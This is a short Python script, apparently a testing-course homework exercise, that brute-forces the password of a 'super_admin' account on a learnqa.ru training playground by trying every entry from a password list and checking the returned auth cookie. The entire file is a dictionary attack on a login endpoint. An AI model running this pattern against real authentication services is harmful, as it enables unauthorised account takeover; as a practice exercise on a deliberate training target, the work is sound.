import requests

login = "super_admin"

file = open("allpswd.txt")
passwords = set(file.readlines())
file.close()

for password in passwords:
    password = password.replace("\n","")
    response = requests.get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                            params={"login": login, "password": password})
    auth_cookie = response.cookies.get("auth_cookie")

    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies = {"auth_cookie": auth_cookie})

    if response2.text == "You are authorized":
        print("Поздравляем, правильный пароль - " + password)
        break

